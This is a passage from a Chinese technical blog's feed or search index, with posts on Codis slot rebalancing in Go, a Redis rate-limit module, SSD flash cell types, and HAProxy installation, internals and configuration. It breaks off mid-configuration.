class="hljs-keyword">for</span> _, m := <span class="hljs-keyword">range</span> slots &#123;<br>        <span class="hljs-keyword">if</span> m.GroupID != <span class="hljs-number">0</span> &#123;<br>            <span class="hljs-keyword">continue</span><br>        &#125;<br>        dest := tree.Left().Key.(<span class="hljs-type">int</span>)<br>        tree.Remove(dest)<br><br>        docking = <span class="hljs-built_in">append</span>(docking, m.ID)<br>        moveout[dest]--<br>        tree.Put(dest, <span class="hljs-literal">nil</span>)<br>    &#125;<br><br>    <span class="hljs-comment">// 每个group最大的slots数量</span><br>    <span class="hljs-keyword">var</span> upperBound = (MaxSlotNum + <span class="hljs-built_in">len</span>(groupIds) - <span class="hljs-number">1</span>) / <span class="hljs-built_in">len</span>(groupIds)<br><br>    <span class="hljs-comment">// 统计分配Slots</span><br>    <span class="hljs-keyword">for</span> tree.Size() &gt;= <span class="hljs-number">2</span> &#123;<br>        from := tree.Right().Key.(<span class="hljs-type">int</span>)<br>        tree.Remove(from)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(pendings[from]) == moveout[from] &#123;<br>            <span class="hljs-keyword">continue</span><br>        &#125;<br>        dest := tree.Left().Key.(<span class="hljs-type">int</span>)<br>        tree.Remove(dest)<br><br>        <span class="hljs-keyword">var</span> (<br>            fromSize = groupSize(from)<br>            destSize = groupSize(dest)<br>        )<br>        <span class="hljs-keyword">if</span> fromSize &lt;= lowerBound &#123;<br>            <span class="hljs-keyword">break</span><br>        &#125;<br>        <span class="hljs-keyword">if</span> destSize &gt;= upperBound &#123;<br>            <span class="hljs-keyword">break</span><br>        &#125;<br>        <span class="hljs-keyword">if</span> d := fromSize - destSize; d &lt;= <span class="hljs-number">1</span> &#123;<br>            <span class="hljs-keyword">break</span><br>        &#125;<br>        moveout[from]++<br>        moveout[dest]--<br><br>        tree.Put(from, <span class="hljs-literal">nil</span>)<br>        tree.Put(dest, <span class="hljs-literal">nil</span>)<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> gid, n := <span class="hljs-keyword">range</span> moveout &#123;<br>        <span class="hljs-keyword">if</span> n &lt; <span class="hljs-number">0</span> &#123;<br>            <span class="hljs-keyword">continue</span><br>        &#125;<br>        <span class="hljs-keyword">if</span> n &gt; <span class="hljs-number">0</span> &#123;<br>            sids := pendings[gid]<br>            sort.Sort(sort.Reverse(sort.IntSlice(sids)))<br>            docking = <span class="hljs-built_in">append</span>(docking, sids[<span class="hljs-number">0</span>:n]...)<br>            pendings[gid] = sids[n:]<br>        &#125;<br>        <span class="hljs-built_in">delete</span>(moveout, gid)<br>    &#125;<br>    sort.Ints(docking)<br><br>    <span class="hljs-comment">// 构建迁移方案</span><br>    <span class="hljs-keyword">var</span> plans = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]<span class="hljs-type">int</span>)<br>    <span class="hljs-keyword">for</span> _, gid := <span class="hljs-keyword">range</span> groupIds &#123;<br>        <span class="hljs-keyword">var</span> in = -moveout[gid]<br>        <span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; in &amp;&amp; <span class="hljs-built_in">len</span>(docking) != <span class="hljs-number">0</span>; i++ &#123;<br>            plans[docking[<span class="hljs-number">0</span>]] = gid<br>            docking = docking[<span class="hljs-number">1</span>:]<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> plans, <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    groupIds := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;<br>    slots := <span class="hljs-built_in">make</span>([]Slot, MaxSlotNum)<br>    <span class="hljs-keyword">for</span> i := <span class="hljs-keyword">range</span> slots &#123;<br>        slots[i].ID = i<br>    &#125;<br><br>    plans, _ := SlotsRebalance(groupIds, slots[:<span class="hljs-number">10</span>])<br>    <span class="hljs-keyword">for</span> k, v := <span class="hljs-keyword">range</span> plans &#123;<br>        slots[k].GroupID = v<br>    &#125;<br><br>    groupIds = <span class="hljs-built_in">append</span>(groupIds, <span class="hljs-number">4</span>)<br>    plans, _ = SlotsRebalance(groupIds, slots)<br>    fmt.Println(plans)<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Codis </tag>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RedisModule剖析 - RateLimit</title>
      <link href="/2020/05/02/redismodule-ratelimit/"/>
      <url>/2020/05/02/redismodule-ratelimit/</url>
      
        <content type="html"><![CDATA[<p><code>RateLimit</code> 是一款基于 Go的限速库 <a href="https://pkg.go.dev/golang.org/x/time/rate">golang.org&#x2F;x&#x2F;time&#x2F;rate</a> （基于 <code>令牌桶</code> ） 实现的针对于 <code>key</code> 的限速模块，该模块并非直接拦截 <code>Redis</code> 中关于特定 <code>key</code> 的操作指令，而是每次在需要执行操作指令之前，先发送一个判断命令（该模块提供的特殊命令），通过这种方式来实现限速的目的。</p><h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><ul><li>GitHub 地址：<a href="https://github.com/linfangrong/redismodule-ratelimit">https://github.com/linfangrong/redismodule-ratelimit</a></li></ul><h2 id="二、架构设计"><a href="#二、架构设计" class="headerlink" title="二、架构设计"></a>二、架构设计</h2><h3 id="2-1、相关命令"><a href="#2-1、相关命令" class="headerlink" title="2.1、相关命令"></a>2.1、相关命令</h3><ul><li>ratelimit.allow : 为指定的 <code>key</code> 设置操作速率约束，后续判断是否能够继续执行需要事先发送该命令进行判断；</li></ul><h3 id="2-2、相关代码"><a href="#2-2、相关代码" class="headerlink" title="2.2、相关代码"></a>2.2、相关代码</h3><figure class="highlight go"><table><tr><td class="code"><pre><code class="hljs go"><br><span class="hljs-comment">// 创建一个新的限速器</span><br><span class="hljs-keyword">var</span> lm *Limiter = NewLimiter()<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewLimiter</span><span class="hljs-params">()</span></span> (lm *Limiter) &#123;<br>lm = &amp;Limiter&#123;<br>dataList: list.New(),<br>dataMap:  <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]*list.Element),<br>&#125;<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">for</span> <span class="hljs-keyword">range</span> time.Tick(time.Minute) &#123;<br>lm.gc()<br>&#125;<br>&#125;()<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-comment">// 判断本次请求是否满足速率约束</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Allow</span><span class="hljs-params">(resource <span class="hljs-type">string</span>, interval <span class="hljs-type">int64</span>, burst <span class="hljs-type">int64</span>)</span></span> <span class="hljs-type">bool</span> &#123;<br><span class="hljs-keyword">var</span> (<br>now         time.Time     = time.Now()<br>rateLimiter *rate.Limiter = lm.GetRateLimiter(resource, now, interval, burst)<br>)<br><span class="hljs-comment">// 调用 Go 限速库接口</span><br><span class="hljs-keyword">return</span> rateLimiter.AllowN(now, <span class="hljs-number">1</span>)<br>&#125;<br><br><span class="hljs-comment">// 速率判断函数</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(lm *Limiter)</span></span> GetRateLimiter(resource <span class="hljs-type">string</span>, timestamp time.Time, interval <span class="hljs-type">int64</span>, burst <span class="hljs-type">int64</span>) (rateLimiter *rate.Limiter) &#123;<br><span class="hljs-keyword">var</span> (<br>item    *limiterItem<br>element *list.Element<br>ok      <span class="hljs-type">bool</span><br>)<br>lm.RLock()<br>element, ok = lm.dataMap[resource]<br>lm.RUnlock()<br><span class="hljs-keyword">if</span> ok &#123;<br><span class="hljs-comment">// 当对应key已经存在时，更新对应key的限速配置</span><br>item = element.Value.(*limiterItem)<br>item.update(timestamp, interval, burst)<br>lm.dataList.MoveToFront(element)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">// 当对应key不存在时，创建新的限速对象</span><br>item = newLimiterItem(resource, timestamp, interval, burst)<br>lm.Lock()<br>element = lm.dataList.PushFront(item)<br>lm.dataMap[resource] = element<br>lm.Unlock()<br>&#125;<br><span class="hljs-keyword">return</span> item.rateLimiter<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-3、持久化"><a href="#2-3、持久化" class="headerlink" title="2.3、持久化"></a>2.3、持久化</h3><p>该模块未提供任何的数据持久化方式，当实例重启后数据会丢失。</p>]]></content>
      
      
      <categories>
          
          <category> Redis </category>
          
          <category> RedisModule </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
            <tag> RedisModule </tag>
            
            <tag> RateLimit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSD存储结构对比分析</title>
      <link href="/2020/02/01/ssd-storage-structure/"/>
      <url>/2020/02/01/ssd-storage-structure/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>SSD的存储单元包含如下几种：SLC、MLC、TLC和QLC，下面对比分析一下这几种存储颗粒的差异。</p><h2 id="二、SLC（Single-Level-Cell）"><a href="#二、SLC（Single-Level-Cell）" class="headerlink" title="二、SLC（Single-Level Cell）"></a>二、SLC（Single-Level Cell）</h2><p>每个<code>Cell</code>单元存储<code>1bit</code>信息，也就是只有<code>0</code>、<code>1</code>两种电压变化，结构简单，电压控制也快速；</p><h3 id="2-1、优缺点"><a href="#2-1、优缺点" class="headerlink" title="2.1、优缺点"></a>2.1、优缺点</h3><ul><li><p><strong>优点：</strong></p><ul><li>寿命长，性能强；</li><li>读写速度最快的NAND闪存芯片规格；</li><li>与任何其他类型的闪存相比，擦写寿命和读写循环的周期最长；</li><li>读取&#x2F;写入错误的发生几率更小，并可在跨度更大的温度范围内正常运行；</li></ul></li><li><p><strong>缺点：</strong></p><ul><li>容量低，成本高；</li><li>市场上最昂贵的NAND闪存类型；</li><li>通常只有较小的容量；</li></ul></li></ul><h3 id="2-2、适用对象"><a href="#2-2、适用对象" class="headerlink" title="2.2、适用对象"></a>2.2、适用对象</h3><ul><li>需要大量读取&#x2F;写入周期的工业级负载，例如服务器；</li></ul><h2 id="三、MLC（Multi-Level-Cell）"><a href="#三、MLC（Multi-Level-Cell）" class="headerlink" title="三、MLC（Multi-Level Cell）"></a>三、MLC（Multi-Level Cell）</h2><p>每个<code>cell</code>单元存储<code>2bit</code>信息，需要更复杂的电压控制，有<code>00</code>，<code>01</code>，<code>10</code>，<code>11</code>四种变化，这也意味着写入性能、可靠性能降低了。其P&#x2F;E寿命根据不同制程在3000-5000次不等。</p><h3 id="3-1、优缺点"><a href="#3-1、优缺点" class="headerlink" title="3.1、优缺点"></a>3.1、优缺点</h3><ul><li><p><strong>优点：</strong></p><ul><li>扩展的SSD的容量，也拥有合理的性价比；</li><li>比TLC闪存表现更加稳定；</li></ul></li><li><p><strong>缺点：</strong></p><ul><li>不如SLC闪存那般耐用可靠；</li></ul></li></ul><h3 id="3-2、适用对象"><a href="#3-2、适用对象" class="headerlink" title="3.2、适用对象"></a>3.2、适用对象</h3><ul><li>较频繁地使用计算机的用户或游戏玩家；</li></ul><h2 id="四、TLC（Trinary-Level-Cell）"><a href="#四、TLC（Trinary-Level-Cell）" class="headerlink" title="四、TLC（Trinary-Level Cell）"></a>四、TLC（Trinary-Level Cell）</h2><p>每个<code>cell</code>单元存储<code>3bit</code>信息，电压从<code>000</code>到<code>111</code>有8种变化，容量比<code>MLC</code>再次增加<code>1/3</code>，成本更低，但是架构更复杂，P&#x2F;E编程时间长，写入速度慢，P&#x2F;E寿命也降至1000-3000次，部分情况会更低。寿命短只是相对而言的，通常来讲，经过重度测试的TLC颗粒正常使用5年以上是没有问题的。</p><h3 id="4-1、优缺点"><a href="#4-1、优缺点" class="headerlink" title="4.1、优缺点"></a>4.1、优缺点</h3><ul><li><strong>优点：</strong><ul><li>较低的生产成本开启了廉价大容量SSD市场；</li></ul></li><li><strong>缺点：</strong><ul><li>与SLC、MLC相比，TLC储存单元的擦写寿命要短得多；</li><li>理论上读写速度与SLC、MLC相比较慢；</li></ul></li></ul><h3 id="4-2、适用对象"><a href="#4-2、适用对象" class="headerlink" title="4.2、适用对象"></a>4.2、适用对象</h3><ul><li>对存储需求不大的轻度使用需求的计算机用户，比如只使用上网、邮件等简单功能的上网本、平板；</li></ul><h2 id="五、QLC（4bit-MLC）"><a href="#五、QLC（4bit-MLC）" class="headerlink" title="五、QLC（4bit MLC）"></a>五、QLC（4bit MLC）</h2><p>电压有<code>16</code>种变化，但是容量能增加<code>33%</code>，就是写入性能、P&#x2F;E寿命与TLC相比会进一步降低。具体的性能测试上，美光有做过实验。读取速度方面，SATA接口中的二者都可以达到540MB&#x2F;S，QLC表现差在写入速度上，因为其P&#x2F;E编程时间就比MLC、TLC更长，速度更慢，连续写入速度从520MB&#x2F;s降至360MB&#x2F;s，随机性能更是从9500 IOPS降至5000 IOPS，损失将近一半。</p><h3 id="5-1、优缺点"><a href="#5-1、优缺点" class="headerlink" title="5.1、优缺点"></a>5.1、优缺点</h3><ul><li><strong>优点：</strong><ul><li>总成本更低，进行存储时依靠更少驱动器来实现；</li><li>具有更多容量，储存密度高，从而获得更好的效益；</li></ul></li><li><strong>缺点：</strong><ul><li>与SLC、MLC相比，QLC的性能和写入寿命有所降低，但与TLC相当；</li></ul></li></ul><h3 id="5-2、适用对象"><a href="#5-2、适用对象" class="headerlink" title="5.2、适用对象"></a>5.2、适用对象</h3><ul><li>比较适合把SSD作为数据仓库的用户；</li><li>对数据存储量的需求较大、平时对计算机进行轻度使用（写入操作少）、或者追求较低价格，建议选用；</li></ul><h2 id="六、性能对比"><a href="#六、性能对比" class="headerlink" title="六、性能对比"></a>六、性能对比</h2><p>在客观限制条件一致的前提下理论的对比数据以及存储单元结构如下所示；</p><table><thead><tr><th align="center">对比项目</th><th align="center">SLC</th><th align="center">MLC</th><th align="center">TLC</th><th align="center">QLC</th></tr></thead><tbody><tr><td align="center">读写性能</td><td align="center">最好</td><td align="center">好</td><td align="center">差</td><td align="center">最差</td></tr><tr><td align="center">价格</td><td align="center">最高</td><td align="center">高</td><td align="center">低</td><td align="center">最低</td></tr><tr><td align="center">存储空间</td><td align="center">最小</td><td align="center">小</td><td align="center">大</td><td align="center">最大</td></tr><tr><td align="center">擦写寿命</td><td align="center">最长</td><td align="center">长</td><td align="center">短</td><td align="center">最短</td></tr></tbody></table><p><img src="/assets/images/ssd-storage-structure.png" alt="存储结构对比" loading="lazy"></p>]]></content>
      
      
      
        <tags>
            
            <tag> SSD </tag>
            
            <tag> 存储介质 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HAProxy的学习与使用</title>
      <link href="/2020/01/01/haproxy/"/>
      <url>/2020/01/01/haproxy/</url>
      
        <content type="html"><![CDATA[<p><a href="http://www.haproxy.org/">HAProxy</a> 是一个用于提供高可用、负载均衡以及基于四层和七层网络的代理软件，常使用于对性能要求较高，差错容忍度较低的场景。</p><h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><h3 id="1-1、安装"><a href="#1-1、安装" class="headerlink" title="1.1、安装"></a>1.1、安装</h3><p>前往HAProxy的<a href="http://www.haproxy.org/">官网</a>，下载指定版本的源码包文件（当前的最新版本为<a href="http://www.haproxy.org/download/2.1/src/haproxy-2.1.2.tar.gz">2.1.2</a>）进行安装，其中<code>TARGET</code>后的具体参数依据系统的内核版本进行指定；</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">wget http://www.haproxy.org/download/2.1/src/haproxy-2.1.2.tar.gz<br>tar -zxvf haproxy-2.1.2.tar.gz<br><span class="hljs-built_in">cd</span> haproxy-2.1.2<br>make TARGET=linux310<br>make install<br></code></pre></td></tr></table></figure><h3 id="1-2、运行"><a href="#1-2、运行" class="headerlink" title="1.2、运行"></a>1.2、运行</h3><ul><li>创建配置文件：<ul><li>新建配置文件目录：<code>mkdir -p /etc/haproxy</code>；</li><li>复制配置文件模板：各类模板为源码包中的<code>./examples/*.cfg</code>文件，这里使用<code>./examples/socks4.cfg</code>文件，指令为：<code>cp ./examples/socks4.cfg /etc/haproxy/haproxy.cfg</code>；</li></ul></li><li>启动：<code>haproxy -f /etc/haproxy/haproxy.cfg</code>；</li></ul><h2 id="二、详细介绍"><a href="#二、详细介绍" class="headerlink" title="二、详细介绍"></a>二、详细介绍</h2><h3 id="2-1、调度管理"><a href="#2-1、调度管理" class="headerlink" title="2.1、调度管理"></a>2.1、调度管理</h3><p>HAProxy 的调度管理主要在<code>run_poll_loop</code>中循环实现。采用事件驱动模型显著降低了上下文切换的开销及内存占用，主循环的结构比较清晰，主循环的执行逻辑如下所示，相关代码如下所示：</p><ul><li>处理信号队列；</li><li>唤醒超时任务；</li><li>处理可运行的任务；</li><li>检测是否结束循环；</li><li>执行 poll 处理 fd 的 IO 事件；</li><li>处理可能仍有 IO 事件的 fd；</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* 运行轮询循环 */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">run_poll_loop</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> next, wake;<br><br>tv_update_date(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>);<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br><span class="hljs-comment">/* 处理一些任务 */</span><br>process_runnable_tasks();<br><br><span class="hljs-comment">/* 检查我们是否捕获了一些信号并在第一个线程中对其进行处理 */</span><br><span class="hljs-keyword">if</span> (tid == <span class="hljs-number">0</span>)<br>signal_process_queue();<br><br><span class="hljs-comment">/* 检查我们是否可以使某些任务过期 */</span><br>next = wake_expired_tasks();<br><br><span class="hljs-comment">/* 当无事可做时停止 */</span><br><span class="hljs-keyword">if</span> ((jobs - unstoppable_jobs) == <span class="hljs-number">0</span>)<br><span class="hljs-keyword">break</span>;<br><br><span class="hljs-comment">/* 如果我们未能彻底停止所有任务，也将停止 */</span><br><span class="hljs-keyword">if</span> (killed &gt; <span class="hljs-number">1</span>)<br><span class="hljs-keyword">break</span>;<br><br><span class="hljs-comment">/* 如果事件处于等待中，则立即过期 */</span><br>wake = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">if</span> (thread_has_tasks())<br>activity[tid].wake_tasks++;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (signal_queue_len &amp;&amp; tid == <span class="hljs-number">0</span>)<br>activity[tid].wake_signal++;<br><span class="hljs-keyword">else</span> &#123;<br>_HA_ATOMIC_OR(&amp;sleeping_thread_mask, tid_bit);<br>__ha_barrier_atomic_store();<br><span class="hljs-keyword">if</span> ((global_tasks_mask &amp; tid_bit) || thread_has_tasks()) &#123;<br>activity[tid].wake_tasks++;<br>_HA_ATOMIC_AND(&amp;sleeping_thread_mask, ~tid_bit);<br>&#125; <span class="hljs-keyword">else</span><br>wake = <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/* 轮询程序将确保它在下一次循环前返回 */</span><br>cur_poller.poll(&amp;cur_poller, next, wake);<br><br>activity[tid].loops++;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-2、信号管理"><a href="#2-2、信号管理" class="headerlink" title="2.2、信号管理"></a>2.2、信号管理</h3><p>HAProxy 封装了自己的信号处理机制。接受到信号之后，将该信号放到信号队列中。<code>signal_register_fct</code>，<code>signal_register_task</code>接口提供了注册函数回调和任务类型回调两种方式。在程序运行到<code>signal_process_queue()</code>时处理所有位于信号队列中的信号。</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* 调用所有未决信号的处理程序，并清除计数和队列长度。</span><br><span class="hljs-comment"> * 处理程序可以在被调用时通过调用signal_register（）来注销自身，</span><br><span class="hljs-comment"> * 就像使用普通的信号处理程序一样。</span><br><span class="hljs-comment"> * 请注意，调用内联版本会更有效，该版本会在到达此处之前检查队列长度。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> __signal_process_queue()<br>&#123;<br><span class="hljs-type">int</span> sig, cur_pos = <span class="hljs-number">0</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">signal_descriptor</span> *<span class="hljs-title">desc</span>;</span><br><span class="hljs-type">sigset_t</span> old_sig;<br><br><span class="hljs-comment">/* 处理期间阻止信号传递 */</span><br>ha_sigmask(SIG_SETMASK, &amp;blocked_sig, &amp;old_sig);<br><br><span class="hljs-comment">/* 重要的是，我们向前扫描队列，这样我们就可以捕获将</span><br><span class="hljs-comment"> * 由另一个信号处理程序排队的任何信号。这允许真实的</span><br><span class="hljs-comment"> * 信号处理程序将信号重新分配给订阅了信号零的任务。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">for</span> (cur_pos = <span class="hljs-number">0</span>; cur_pos &lt; signal_queue_len; cur_pos++) &#123;<br>sig  = signal_queue[cur_pos];<br>desc = &amp;signal_state[sig];<br><span class="hljs-keyword">if</span> (desc-&gt;count) &#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sig_handler</span> *<span class="hljs-title">sh</span>, *<span class="hljs-title">shb</span>;</span><br>list_for_each_entry_safe(sh, shb, &amp;desc-&gt;handlers, <span class="hljs-built_in">list</span>) &#123;<br><span class="hljs-keyword">if</span> ((sh-&gt;flags &amp; SIG_F_TYPE_FCT) &amp;&amp; sh-&gt;handler)<br>((<span class="hljs-type">void</span> (*)(<span class="hljs-keyword">struct</span> sig_handler *))sh-&gt;handler)(sh);<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((sh-&gt;flags &amp; SIG_F_TYPE_TASK) &amp;&amp; sh-&gt;handler)<br>task_wakeup(sh-&gt;handler, TASK_WOKEN_SIGNAL);<br>&#125;<br>desc-&gt;count = <span class="hljs-number">0</span>;<br>&#125;<br>&#125;<br>signal_queue_len = <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">/* 恢复信号传递 */</span><br>ha_sigmask(SIG_SETMASK, &amp;old_sig, <span class="hljs-literal">NULL</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>信号注册时注册<code>SIG_F_TYPE_FCT</code>标识则直接调用信号回调处理；<code>SIG_F_TYPE_TASK</code>标识说明注册时回调函数是一个Task指针，这时需要唤醒Task，并指明任务状态为<code>TASK_WOKEN_SIGNAL</code>，此后对应处理函数将在Task管理下处理。</p><h4 id="2-2-1、优雅的重启信号"><a href="#2-2-1、优雅的重启信号" class="headerlink" title="2.2.1、优雅的重启信号"></a>2.2.1、优雅的重启信号</h4><p>为了能够进行优雅的重启，<code>wrapper</code>中守护<code>SIGUSR2</code>信号进行重启。</p><ul><li>尝试读取旧的Pids，如果存在旧的Pids，说明存在之前启动的相关进程；</li><li>启动时增加<code>-sf</code>选项，在进入新的<code>HAProxy</code>程序后会对向所有旧进程发出<code>SIGUSR1</code>信号；</li><li>旧的<code>HAProxy</code>程序捕获<code>SIGUSR1</code>执行对应回调<code>sig_soft_stop</code>优雅退出；</li></ul><h3 id="2-3、Task管理"><a href="#2-3、Task管理" class="headerlink" title="2.3、Task管理"></a>2.3、Task管理</h3><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* 所有任务的基础 */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task</span> &#123;</span><br>TASK_COMMON;<span class="hljs-comment">/* 必须在开头！ */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">eb32sc_node</span> <span class="hljs-title">rq</span>;</span><span class="hljs-comment">/* ebtree节点，用于将任务保存在运行队列中 */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">eb32_node</span> <span class="hljs-title">wq</span>;</span><span class="hljs-comment">/* ebtree节点，用于将任务保存在等待队列中 */</span><br><span class="hljs-type">int</span> expire;<span class="hljs-comment">/* 此任务的下一个到期日期，以时钟为单位 */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> thread_mask;<span class="hljs-comment">/* 授权处理任务的线程ID的掩码 */</span><br><span class="hljs-type">uint64_t</span> call_date;<span class="hljs-comment">/* 最后一次任务唤醒或调用的日期 */</span><br><span class="hljs-type">uint64_t</span> lat_time;<span class="hljs-comment">/* 经历的总延迟时间 */</span><br><span class="hljs-type">uint64_t</span> cpu_time;              <span class="hljs-comment">/* 消耗的总CPU时间 */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>HAProxy的调度最终都在Task内回调处理，为提升性能，Task的管理是采用<code>ebtree树形队列</code>方式，分为 <code>wait queue</code>和<code>run queue</code>：</p><ul><li><code>wait queue</code>：需要等待一定时间的task 的集合；</li><li><code>run queue</code>：需要立即执行的 task 的集合；</li></ul><p>使用wake_expired_tasks()函数以及process_runnable_tasks()函数来处理相关的操作：</p><ul><li><code>wake_expired_tasks()函数</code>：用来唤醒超时任务，检查<code>wait queue</code>中那些超时的任务，并将其放到<code>run queue</code>中；</li><li><code>process_runnable_tasks()函数</code>：处理位于<code>run queue</code>中的任务，对于TCP或者HTTP业务流量的处理，该函数最终通过调用 <code>process_session</code> 来完成，包括解析已经接收到的数据， 并执行一系列 load balance 的特性，但不负责从 socket 收发数据，数据收发由poll完成。同时，也会因为一些情况导致需要将当前的任务通过调用 <code>task_queue</code> 等接口放到 <code>wait queue</code> 中，实现上在任务回调处理时返回非空任务则会把任务重新加入<code>wait queue</code>；</li></ul><h3 id="2-4、配置相关"><a href="#2-4、配置相关" class="headerlink" title="2.4、配置相关"></a>2.4、配置相关</h3><p>HAProxy配置中分五大部分：</p><ul><li><p><code>global</code>：全局配置参数，属于进程级的配置，通常与操作系统的配置有关；</p></li><li><p><code>defaults</code>：配置一些默认的参数，可以被<code>frontend</code>，<code>backend</code>，<code>listen</code>段继承使用，如果<code>frontend</code>、<code>backend</code>、<code>listen</code>部分也配置了与<code>defaults</code>部分一样的参数，<code>defaults</code>部分参数对应的值自动被覆盖；</p></li><li><p><code>frontend</code>：接收请求的前端虚拟节点，用来匹配接收客户所请求的域名，uri等，并针对不同的匹配做不同的请求处理，可直接指定具体使用后端的<code>backend</code>（<code>1.3</code>版本之后引入）；</p></li><li><p><code>backend</code>：后端服务集群的配置，真实服务器，一个<code>backend</code>对应一个或者多个实体服务器（<code>1.3</code>版本之后引入）；</p></li><li><p><code>listen</code>：<code>frontend</code>和<code>backend</code>的组合体，在<code>1.3</code>版本之前，HAProxy的所有配置选项都在这个部分中设置，为了保持兼容性，新的版本依然保留了<code>listen</code>组件配置；</p></li></ul><h4 id="2-4-1、global配置"><a href="#2-4-1、global配置" class="headerlink" title="2.4.1、global配置"></a>2.4.1、global配置</h4><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">global<br>     <span class="hljs-built_in">log</span> 127.0.0.1 local0 info<br>     uid 99<br>     gid 99<br>     daemon<br>     nbproc 16<br>     maxconn 4096<br>     <span class="hljs-built_in">ulimit</span> -n 65536<br>     pidfile /var/run/haproxy.pid<br></code></pre></td></tr></table></figure><ul><li><code>log</code>：日志输出设置；</li><li><code>uid</code>：运行的用户 uid；</li><li><code>gid</code>：运行的用户组gid；</li><li><code>daemon</code>：后台运行；</li><li><code>nbproc</code>：设置进程数量；</li><li><code>maxconn</code>：默认最大连接数；</li><li><code>ulimit -n</code>：设置最大打开的文件描述符数；</li><li><code>pidfile</code>：进程PID文件；</li></ul><h4 id="2-4-2、default配置"><a href="#2-4-2、default配置" class="headerlink" title="2.4.2、default配置"></a>2.4.2、default配置</h4><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">defaults<br>     mode http<br>     <span class="hljs-built_in">log</span> 127.0.0.1 local3 err<br>     retries 3<br>     option httplog<br>     option redispatch<br>     option abortonclose<br>     option dontlognull<br>     <span class="hljs-built_in">timeout</span> connect 5000<br>     <span class="hljs-built_in">timeout</span> client 3000<br>     <span class="hljs-built_in">timeout</span> server 3000<br></code></pre></td></tr></table></figure><ul><li><p><code>mode</code>：</p><ul><li><code>http</code>：七层模式；</li><li><code>tcp</code>：四层模式；</li><li><code>health</code>：健康检测；</li></ul></li><li><p><code>log</code>：日志输出设置；</p></li><li><p><code>retries</code>：定义连接后端服务器的失败重连次数，连接失败超过此值后会将对应后端服务器标记不可用；</p></li><li><p><code>option</code>：</p><ul><li><code>httplog</code>：启用日志记录HTTP请求，默认不记录HTTP请求日志；</li><li><code>tcplog</code>：启用日志记录TCP请求，默认不记录TCP请求日志；</li><li><code>redispatch</code>：当使用了cookie时，haproxy将会将其请求的后端服务器的serverID插入到cookie中，以保证会话的session的持久性，如果后端的服务器宕掉了，但是客户端的cookie是不会刷新的，如果设置此参数，将会将客户的请求强制定向到另外一个后端server上，以保证服务的正常；</li><li><code>abortonclose</code>：当服务器负载很高的时候，自动结束掉当前队列处理比较久的链接；</li><li><code>dontlognull</code>：启用该项，日志中将不会记录空连接。所谓空连接就是在上游的负载均衡器或者监控系统为了探测该服务是否存活可用时，需要定期的连接或者获取某一固定的组件或页面，或者探测扫描端口是否在监听或开放等动作被称为空连接；官方文档中标注，如果该服务上游没有其他的负载均衡器的话，建议不要使用该参数，因为互联网上的恶意扫描或其他动作就不会被记录下来；</li></ul></li><li><p><code>timeout 